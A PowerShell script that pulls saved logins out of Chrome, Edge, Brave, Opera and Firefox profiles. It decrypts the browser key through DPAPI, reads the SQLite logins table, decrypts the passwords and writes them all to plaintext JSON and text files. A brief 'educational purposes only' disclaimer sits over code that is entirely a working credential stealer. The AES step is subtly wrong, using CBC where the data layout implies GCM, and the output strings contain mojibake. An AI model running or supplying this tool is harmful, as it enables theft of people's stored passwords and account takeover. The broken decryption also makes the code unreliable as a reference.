# BrowserPasswordExtractor.ps1

# Function to decrypt data using DPAPI
function Decrypt-DPAPI {
    param(
        [byte[]]$encryptedData
    )
    
    try {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class DPAPIHelper {
    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        string szDataDescr,
        ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved,
        ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct CRYPTPROTECT_PROMPTSTRUCT {
        public int cbSize;
        public int dwPromptFlags;
        public IntPtr hwndApp;
        public string szPrompt;
    }

    public static byte[] Decrypt(byte[] encryptedData) {
        if (encryptedData == null || encryptedData.Length == 0)
            return null;

        DATA_BLOB dataIn = new DATA_BLOB();
        DATA_BLOB dataOut = new DATA_BLOB();
        CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
        DATA_BLOB entropy = new DATA_BLOB();

        try {
            dataIn.cbData = encryptedData.Length;
            dataIn.pbData = Marshal.AllocHGlobal(dataIn.cbData);
            Marshal.Copy(encryptedData, 0, dataIn.pbData, dataIn.cbData);

            prompt.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
            prompt.dwPromptFlags = 0;
            prompt.hwndApp = IntPtr.Zero;
            prompt.szPrompt = null;

            bool success = CryptUnprotectData(
                ref dataIn,
                null,
                ref entropy,
                IntPtr.Zero,
                ref prompt,
                0,
                ref dataOut);

            if (success) {
                byte[] decryptedBytes = new byte[dataOut.cbData];
                Marshal.Copy(dataOut.pbData, decryptedBytes, 0, dataOut.cbData);
                return decryptedBytes;
            }
            return null;
        }
        finally {
            if (dataIn.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(dataIn.pbData);
            if (dataOut.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(dataOut.pbData);
        }
    }
}
'@
        
        if ($encryptedData -eq $null -or $encryptedData.Length -eq 0) {
            return $null
        }
        
        $decrypted = [DPAPIHelper]::Decrypt($encryptedData)
        return $decrypted
        
    } catch {
        Write-Host "    ‚ùå DPAPI Decryption Error: $_" -ForegroundColor Red
        return $null
    }
}

# Browser Password Extractor Class
class BrowserPasswordExtractor {
    # Browser definitions
    [hashtable]$Browsers = @{
        "Chrome"  = "GetChromePaths"
        "Edge"    = "GetEdgePaths"
        "Brave"   = "GetBravePaths"
        "Opera"   = "GetOperaPaths"
        "Firefox" = "GetFirefoxPaths"
    }
    
    # Constructor
    BrowserPasswordExtractor() {
        # Check if running as administrator
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Host "‚ö†Ô∏è  Warning: Running without Administrator privileges" -ForegroundColor Yellow
            Write-Host "   Some browsers may not be accessible" -ForegroundColor Yellow
        }
    }
    
    # Get Chrome profile paths
    [array]GetChromePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Edge profile paths
    [array]GetEdgePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Edge\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Brave browser profile paths
    [array]GetBravePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\BraveSoftware\Brave-Browser\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Opera profile paths
    [array]GetOperaPaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Roaming\Opera Software\Opera Stable"
        $profiles = @()
        
        if (Test-Path $basePath) {
            $loginData = Join-Path $basePath "Login Data"
            if (Test-Path $loginData) {
                $profiles += ,@("Default", $basePath)
            }
        }
        return $profiles
    }
    
    # Get Firefox profile paths
    [array]GetFirefoxPaths() {
        $firefoxPath = Join-Path $env:USERPROFILE "AppData\Roaming\Mozilla\Firefox\Profiles"
        $profiles = @()
        
        if (Test-Path $firefoxPath) {
            $profileDirs = Get-ChildItem -Path $firefoxPath -Directory -Filter "*.default*" -ErrorAction SilentlyContinue
            foreach ($profileDir in $profileDirs) {
                $profiles += ,@($profileDir.Name, $profileDir.FullName)
            }
        }
        return $profiles
    }
    
    # Get profiles for Chromium-based browsers
    [array]GetChromiumProfiles([string]$basePath) {
        $profiles = @()
        
        if (Test-Path $basePath) {
            # Default profile
            $defaultProfile = Join-Path $basePath "Default"
            $defaultLoginData = Join-Path $defaultProfile "Login Data"
            if (Test-Path $defaultLoginData) {
                $profiles += ,@("Default", $defaultProfile)
            }
            
            # Other profiles
            $profileDirs = Get-ChildItem -Path $basePath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue
            foreach ($profileDir in $profileDirs) {
                $loginData = Join-Path $profileDir.FullName "Login Data"
                if (Test-Path $loginData) {
                    $profiles += ,@($profileDir.Name, $profileDir.FullName)
                }
            }
        }
        return $profiles
    }
    
    # Get encryption key for Chromium-based browsers
    [byte[]]GetEncryptionKey([string]$browserPath) {
        $localStatePath = Join-Path $browserPath "Local State"
        
        try {
            if (-not (Test-Path $localStatePath)) {
                Write-Host "    ‚ùå Local State file not found: $localStatePath" -ForegroundColor Red
                return $null
            }
            
            # Read and parse JSON
            $localStateContent = Get-Content $localStatePath -Raw -ErrorAction Stop
            $localStateJson = $localStateContent | ConvertFrom-Json -ErrorAction Stop
            
            # Get encrypted key
            $encryptedKeyBase64 = $localStateJson.os_crypt.encrypted_key
            
            if ([string]::IsNullOrEmpty($encryptedKeyBase64)) {
                Write-Host "    ‚ùå No encrypted key found" -ForegroundColor Red
                return $null
            }
            
            # Decode base64
            $encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
            
            if ($encryptedKey.Length -le 5) {
                Write-Host "    ‚ùå Invalid encryption key length" -ForegroundColor Red
                return $null
            }
            
            # Remove DPAPI prefix (first 5 bytes: "DPAPI")
            $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
            
            # Decrypt using DPAPI
            $decryptedKey = Decrypt-DPAPI -encryptedData $encryptedKey
            
            if ($decryptedKey) {
                return $decryptedKey
            } else {
                Write-Host "    ‚ùå Failed to decrypt encryption key" -ForegroundColor Red
                return $null
            }
            
        } catch {
            Write-Host "    ‚ùå Error getting encryption key: $_" -ForegroundColor Red
            return $null
        }
    }
    
    # Decrypt Chromium password
    [string]DecryptChromiumPassword([byte[]]$encryptedPassword, [byte[]]$key) {
        try {
            if ($null -eq $encryptedPassword -or $encryptedPassword.Length -eq 0) {
                return ""
            }
            
            # First try DPAPI for older passwords
            try {
                $decrypted = Decrypt-DPAPI -encryptedData $encryptedPassword
                if ($decrypted) {
                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    if (-not [string]::IsNullOrEmpty($password)) {
                        return $password
                    }
                }
            } catch {
                # Continue to AES decryption
            }
            
            # Try AES decryption for newer passwords
            if ($key -and $key.Length -ge 16 -and $encryptedPassword.Length -ge 15) {
                try {
                    # Extract IV (first 12 bytes after v10/v20)
                    $iv = $encryptedPassword[3..14]
                    
                    # Extract ciphertext (rest except last 16 bytes for tag)
                    $ciphertextLength = $encryptedPassword.Length - 15 - 16
                    if ($ciphertextLength -gt 0) {
                        $ciphertext = $encryptedPassword[15..(15 + $ciphertextLength - 1)]
                        
                        # Create AES decryptor
                        $aes = [System.Security.Cryptography.Aes]::Create()
                        $aes.Key = $key
                        $aes.IV = $iv
                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                        
                        $decryptor = $aes.CreateDecryptor()
                        $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
                        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).TrimEnd("`0")
                    }
                } catch {
                    # AES decryption failed
                }
            }
            
            return "[Decryption Failed]"
            
        } catch {
            return "[Error: $_]"
        }
    }
    
    # Extract Firefox passwords (simplified)
    [array]DecryptFirefoxPassword([string]$profilePath) {
        $passwords = @()
        
        try {
            $signonsPath = Join-Path $profilePath "signons.sqlite"
            $loginsPath = Join-Path $profilePath "logins.json"
            
            # Check for new format first
            if (Test-Path $loginsPath) {
                try {
                    $loginsData = Get-Content $loginsPath -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
                    
                    if ($loginsData.logins) {
                        foreach ($login in $loginsData.logins) {
                            $passwords += @{
                                url = if ($login.hostname) { $login.hostname } else { "[Unknown URL]" }
                                username = "[Firefox - Requires Master Password]"
                                password = "[Firefox - Requires Master Password]"
                            }
                        }
                    }
                } catch {
                    Write-Host "    ‚ö†Ô∏è  Could not read Firefox logins.json" -ForegroundColor Yellow
                }
            }
            # Check for old format
            elseif (Test-Path $signonsPath) {
                $passwords += @{
                    url = "Firefox Password Database"
                    username = "[Firefox - Old Format Detected]"
                    password = "[Requires Master Password/Key Files]"
                }
            }
            
        } catch {
            Write-Host "    ‚ö†Ô∏è  Firefox profile access error: $_" -ForegroundColor Yellow
        }
        
        return $passwords
    }
    
    # Extract passwords from Chromium-based browsers using COM
    [array]ExtractChromiumPasswords([string]$browserName, [string]$profileName, [string]$profilePath, [byte[]]$key) {
        $dbPath = Join-Path $profilePath "Login Data"
        
        if (-not (Test-Path $dbPath)) {
            return @()
        }
        
        $passwords = @()
        
        try {
            # Create temporary copy
            $tempDb = Join-Path $env:TEMP "temp_${browserName}_${profileName}.db"
            if (Test-Path $tempDb) {
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
            
            Copy-Item $dbPath $tempDb -Force -ErrorAction Stop
            
            # Check if file was copied
            if (Test-Path $tempDb) {
                # Try to read database using ADO.NET
                try {
                    $connectionString = "Data Source=$tempDb;Version=3;Read Only=True;"
                    
                    # Create connection
                    $connection = New-Object System.Data.SQLite.SQLiteConnection $connectionString
                    
                    try {
                        $connection.Open()
                        $command = $connection.CreateCommand()
                        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                        
                        $reader = $command.ExecuteReader()
                        
                        while ($reader.Read()) {
                            $url = $reader.GetString(0)
                            $username = $reader.GetString(1)
                            $passwordBytes = @()
                            
                            # Get password bytes
                            if (-not $reader.IsDBNull(2)) {
                                $stream = $reader.GetStream(2)
                                $buffer = New-Object byte[] 8192
                                $bytesRead = 0
                                $totalBytes = New-Object System.Collections.ArrayList
                                
                                while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                                    $totalBytes.AddRange($buffer[0..($bytesRead-1)])
                                }
                                
                                $passwordBytes = $totalBytes.ToArray()
                            }
                            
                            if ($passwordBytes -and $passwordBytes.Length -gt 0) {
                                $password = $this.DecryptChromiumPassword($passwordBytes, $key)
                                
                                if (-not [string]::IsNullOrEmpty($username) -and -not [string]::IsNullOrEmpty($password)) {
                                    $passwords += @{
                                        url = $url
                                        username = $username
                                        password = $password
                                    }
                                }
                            }
                        }
                        
                        $reader.Close()
                    } finally {
                        $connection.Close()
                    }
                    
                } catch {
                    Write-Host "      ‚ö†Ô∏è  SQLite extraction requires System.Data.SQLite" -ForegroundColor Yellow
                    Write-Host "      üí° Install with: Install-Package System.Data.SQLite" -ForegroundColor Cyan
                    
                    # Fallback: Show file exists but can't read
                    $fileSize = (Get-Item $tempDb).Length
                    if ($fileSize -gt 0) {
                        $passwords += @{
                            url = "Database Exists"
                            username = "[Install SQLite Package]"
                            password = "File size: $($fileSize) bytes"
                        }
                    }
                }
                
                # Clean up temp file
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
            
        } catch {
            Write-Host "    ‚ö†Ô∏è  Error accessing $browserName database: $_" -ForegroundColor Yellow
        }
        
        return $passwords
    }
    
    # Scan all browsers
    [hashtable]ScanAllBrowsers() {
        Write-Host "`nüåê MULTI-BROWSER PASSWORD EXTRACTOR" -ForegroundColor Cyan
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host ""
        
        $allResults = @{}
        $totalFound = 0
        
        foreach ($browserName in $this.Browsers.Keys | Sort-Object) {
            Write-Host "üîç Scanning $browserName..." -ForegroundColor Yellow
            
            try {
                $profileMethod = $this.Browsers[$browserName]
                $profiles = $this.$profileMethod()
                
                if ($profiles.Count -eq 0) {
                    Write-Host "   üì≠ $browserName not found or no accessible profiles" -ForegroundColor Gray
                    Write-Host ""
                    continue
                }
                
                Write-Host "   ‚úÖ Found $($profiles.Count) profile(s)" -ForegroundColor Green
                
                $browserPasswords = @()
                
                foreach ($profile in $profiles) {
                    $profileName = $profile[0]
                    $profilePath = $profile[1]
                    
                    Write-Host "      üìÅ Profile: $profileName" -ForegroundColor White
                    
                    if ($browserName -eq "Firefox") {
                        $passwords = $this.DecryptFirefoxPassword($profilePath)
                    } else {
                        $browserDir = Split-Path $profilePath -Parent
                        $key = $this.GetEncryptionKey($browserDir)
                        
                        if ($key) {
                            $passwords = $this.ExtractChromiumPasswords($browserName, $profileName, $profilePath, $key)
                        } else {
                            $passwords = @()
                        }
                    }
                    
                    if ($passwords.Count -gt 0) {
                        Write-Host "         üîì Found $($passwords.Count) passwords" -ForegroundColor Green
                    } else {
                        Write-Host "         üîí No passwords found or unable to decrypt" -ForegroundColor Gray
                    }
                    
                    $browserPasswords += $passwords
                }
                
                if ($browserPasswords.Count -gt 0) {
                    $allResults[$browserName] = $browserPasswords
                    $totalFound += $browserPasswords.Count
                    Write-Host "   üìä $browserName Total: $($browserPasswords.Count) passwords" -ForegroundColor Green
                } else {
                    Write-Host "   üìä $browserName: No passwords extracted" -ForegroundColor Gray
                }
                
            } catch {
                Write-Host "   ‚ùå Error scanning $browserName : $_" -ForegroundColor Red
            }
            
            Write-Host ""
        }
        
        return $allResults
    }
    
    # Display results
    [void]DisplayResults([hashtable]$results) {
        Clear-Host
        
        Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
        Write-Host "üìã EXTRACTION RESULTS" -ForegroundColor Yellow
        Write-Host "=" * 80 -ForegroundColor Cyan
        Write-Host ""
        
        $totalPasswords = 0
        
        if ($results.Count -eq 0) {
            Write-Host "‚ùå No passwords were extracted from any browser" -ForegroundColor Red
            Write-Host ""
            Write-Host "Possible reasons:" -ForegroundColor Yellow
            Write-Host "1. Browsers are running (close all browsers and try again)" -ForegroundColor White
            Write-Host "2. No saved passwords exist" -ForegroundColor White
            Write-Host "3. Permission issues (try running as Administrator)" -ForegroundColor White
            Write-Host "4. SQLite library not installed" -ForegroundColor White
            return
        }
        
        foreach ($browserName in ($results.Keys | Sort-Object)) {
            $passwords = $results[$browserName]
            
            if ($passwords.Count -gt 0) {
                Write-Host "üñ•Ô∏è  $($browserName.ToUpper()) - $($passwords.Count) Passwords" -ForegroundColor Green
                Write-Host ("‚îÄ" * 60) -ForegroundColor DarkGray
                
                $counter = 1
                foreach ($entry in $passwords) {
                    Write-Host "   $($counter.ToString().PadLeft(2))." -NoNewline -ForegroundColor White
                    Write-Host " üåê " -NoNewline -ForegroundColor Cyan
                    Write-Host $entry.url -ForegroundColor White
                    
                    if ($entry.username -ne "[Firefox - Requires Master Password]") {
                        Write-Host "        üë§ " -NoNewline -ForegroundColor Gray
                        Write-Host $entry.username -ForegroundColor White
                    } else {
                        Write-Host "        üë§ $($entry.username)" -ForegroundColor Yellow
                    }
                    
                    if ($entry.password -notmatch "^\[.*\]$") {
                        Write-Host "        üîë " -NoNewline -ForegroundColor Gray
                        Write-Host $entry.password -ForegroundColor Red
                    } else {
                        Write-Host "        üîë $($entry.password)" -ForegroundColor Yellow
                    }
                    
                    $counter++
                    if ($counter -gt 10) {
                        Write-Host "        ... and $($passwords.Count - 10) more entries" -ForegroundColor DarkGray
                        break
                    }
                }
                Write-Host ""
                $totalPasswords += $passwords.Count
            }
        }
        
        Write-Host "üìä SUMMARY" -ForegroundColor Cyan
        Write-Host ("‚îÄ" * 40) -ForegroundColor DarkGray
        Write-Host "Total Browsers Scanned: $($results.Count)" -ForegroundColor White
        Write-Host "Total Passwords Found: $totalPasswords" -ForegroundColor White
        Write-Host ""
        
        # Save to file
        $this.SaveToFile($results)
    }
    
    # Save results to file
    [void]SaveToFile([hashtable]$results) {
        try {
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $filename = "browser_passwords_${timestamp}.json"
            
            # Convert to serializable format
            $serializableResults = @{}
            foreach ($browser in $results.Keys) {
                $serializableResults[$browser] = $results[$browser]
            }
            
            # Save JSON
            $serializableResults | ConvertTo-Json -Depth 5 | Out-File -FilePath $filename -Encoding UTF8
            
            # Also save as text file
            $textFilename = "browser_passwords_${timestamp}.txt"
            $output = @()
            $output += "=" * 60
            $output += "BROWSER PASSWORDS EXTRACTION REPORT"
            $output += "Generated on: $(Get-Date)"
            $output += "=" * 60
            $output += ""
            
            foreach ($browserName in ($results.Keys | Sort-Object)) {
                $passwords = $results[$browserName]
                if ($passwords.Count -gt 0) {
                    $output += "$($browserName.ToUpper()) - $($passwords.Count) Passwords"
                    $output += ("-" * 50)
                    
                    $counter = 1
                    foreach ($entry in $passwords) {
                        $output += "$counter. URL: $($entry.url)"
                        $output += "   Username: $($entry.username)"
                        $output += "   Password: $($entry.password)"
                        $output += ""
                        $counter++
                    }
                }
            }
            
            $output | Out-File -FilePath $textFilename -Encoding UTF8
            
            Write-Host "üíæ Results saved to:" -ForegroundColor Green
            Write-Host "   ‚Ä¢ $filename (JSON format)" -ForegroundColor White
            Write-Host "   ‚Ä¢ $textFilename (Text format)" -ForegroundColor White
            Write-Host ""
            
        } catch {
            Write-Host "‚ö†Ô∏è  Could not save results to file: $_" -ForegroundColor Yellow
        }
    }
}

# Main execution function
function Main {
    # Clear screen and show banner
    Clear-Host
    
    Write-Host "===============================================================" -ForegroundColor Cyan
    Write-Host "       MULTI-BROWSER PASSWORD EXTRACTOR TOOL" -ForegroundColor Yellow
    Write-Host "===============================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "‚ö†Ô∏è  IMPORTANT DISCLAIMER:" -ForegroundColor Red
    Write-Host "   This tool is for educational purposes only." -ForegroundColor White
    Write-Host "   Use only on systems you own or have permission to test." -ForegroundColor White
    Write-Host ""
    Write-Host "üìã PREREQUISITES:" -ForegroundColor Yellow
    Write-Host "   1. Close ALL browsers before running" -ForegroundColor White
    Write-Host "   2. Run as Administrator for best results" -ForegroundColor White
    Write-Host "   3. Install SQLite for full functionality" -ForegroundColor White
    Write-Host ""
    
    # Check for SQLite
    try {
        [void][System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite")
    } catch {
        Write-Host "‚ö†Ô∏è  SQLite library not found. Installation options:" -ForegroundColor Yellow
        Write-Host "   Option 1: Download from: https://system.data.sqlite.org" -ForegroundColor Cyan
        Write-Host "   Option 2: Run: Install-Package System.Data.SQLite" -ForegroundColor Cyan
        Write-Host ""
    }
    
    # Confirmation
    Write-Host "Press ENTER to begin extraction..." -NoNewline -ForegroundColor White
    $null = Read-Host
    
    # Create extractor and scan
    try {
        $extractor = [BrowserPasswordExtractor]::new()
        $results = $extractor.ScanAllBrowsers()
        $extractor.DisplayResults($results)
    } catch {
        Write-Host "‚ùå FATAL ERROR: $_" -ForegroundColor Red
        Write-Host "Stack trace:" -ForegroundColor Red
        Write-Host $_.ScriptStackTrace -ForegroundColor Red
    }
    
    # Completion
    Write-Host ""
    Write-Host "‚úÖ Extraction process completed!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Press any key to exit..." -NoNewline -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Entry point
try {
    # Set encoding for proper output
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    
    # Run main function
    Main
} catch {
    Write-Host "‚ùå Script execution failed: $_" -ForegroundColor Red
    Write-Host "Press any key to exit..." -NoNewline
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
